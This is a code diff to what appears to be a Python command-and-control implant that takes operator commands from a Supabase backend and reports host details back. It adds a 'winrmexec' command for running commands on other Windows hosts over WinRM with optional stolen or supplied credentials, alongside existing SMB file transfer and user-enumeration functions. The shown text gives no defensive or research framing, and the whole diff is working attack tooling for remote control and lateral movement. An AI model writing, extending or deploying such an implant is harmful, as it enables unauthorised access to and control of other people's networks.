@@ -10,6 +10,7 @@ from .config import SUPABASE_KEY
 if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi import wls, wami, list_users_in_group, smb_write
     from utils.winapi.smb_get import smb_get  # Ensure correct import
+    from utils.winapi.winrm_execute import winrm_execute  # Import the winrm_execute function
 
 def handle_kill_command(command_id, command_text, hostname, supabase: Client):
     """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
@@ -150,6 +151,28 @@ def execute_commands(supabase: Client):
                             result = smb_get(remote_file_path, local_file_path, username, password, domain)
                         else:
                             result = smb_get(remote_file_path, local_file_path)
+                        status = 'Completed'
+                        output = result
+                    except Exception as e:
+                        status = 'Failed'
+                        output = str(e)
+                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+
+            # Handle 'winrmexec <remote_host> <command> [username password domain]' command only if on Windows
+            elif os.name == 'nt' and command_text.lower().startswith('winrmexec '):
+                parts = command_text.split(' ')
+                if len(parts) < 3:
+                    status = 'Failed'
+                    output = "Invalid winrmexec command format. Use 'winrmexec <remote_host> <command> [username password domain]'."
+                else:
+                    try:
+                        remote_host = parts[1]
+                        command = parts[2]
+                        if len(parts) == 6:
+                            username, password, domain = parts[3], parts[4], parts[5]
+                            result = winrm_execute(remote_host, command, username, password, domain)
+                        else:
+                            result = winrm_execute(remote_host, command)
                         status = 'Completed'
                         output = result
                     except Exception as e:
